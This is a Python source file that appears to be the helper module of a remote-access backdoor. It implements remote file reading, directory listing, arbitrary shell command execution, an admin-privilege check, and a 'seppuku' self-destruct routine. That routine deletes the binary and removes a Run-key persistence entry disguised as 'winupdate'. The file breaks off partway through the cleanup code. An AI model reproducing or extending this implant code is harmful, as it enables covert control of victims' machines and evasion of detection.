
import subprocess
import os
import sys
from win32com.shell import shell
import uuid

def cat(file_path):
    if os.path.isfile(file_path):
        try:
            with open(file_path) as f:
                return f.read(5000)
        except IOError:
            return 'Error, permission denied'
    else:
        return 'Error, file not found'

def execute(command):
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    return output.stdout.read() + output.stderr.read()

def ls(path):
    if not path:
        path = '.'

    if os.path.exists(path):
        try:
            abs_path = os.path.abspath(path)
            _return = '\nDirectory:\n{}\nContents:\n'.format(os.path.abspath(path))
            contents = os.listdir(path)
            _list = ""
            for f in contents:
                if os.path.isfile(abs_path + "\\" + f):
                    signifier = "<FILE>"
                    _list += "{:>2}    {}\n".format(signifier, f)

                elif os.path.isdir(abs_path + "\\" + f):
                    signifier = "<DIR>"
                    _list += "{:>2}     {}\n".format(signifier, f)

                else:
                    signifier = "<???>"
                    _list += "{:>2}     {}\n".format(signifier, f)

            return _return + _list

        except OSError:
            return "Error. Permission Denied"
    else:
        return "Error. Path not found."

def pwd():
    return os.getcwd()

def cd(path):
    if not path:
        path = '.'
    try:
        os.chdir(path)
    except PermissionError:
        return 'Access Denied'
    except FileNotFoundError:
        return 'File not found'

    return 'Directory {}'.format(os.getcwd())

def isadmin(plat):
    is_admin = False

    if(plat == "Windows"):
        is_admin = shell.IsUserAnAdmin() != 0
    elif plat in ['Linux', 'Macintosh']:
        is_admin = os.getuid() == 0
    admin_access = 'Yes' if is_admin else 'No'
    return admin_access

def seppuku(PLAT):
    if(PLAT == "Windows"):
        import winreg
        from winreg import HKEY_CURRENT_USER as HKCU
        
        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
        os.remove(sys.argv[0])
        ## Delete persistence registry key for windows
        try:
            reg_key = winreg.OpenKey(HKCU, run_key, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(reg_key, 'winupdate')
            winreg.CloseKey(reg_key)
        except:
            pass

        ## Deleted Binary file saved to other locations
        userhome = os.path.expanduser('~') 
        username = os.path.split(userhome)[-1]
        #user = os.getenv('USERNAME')
        path = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\".format(username)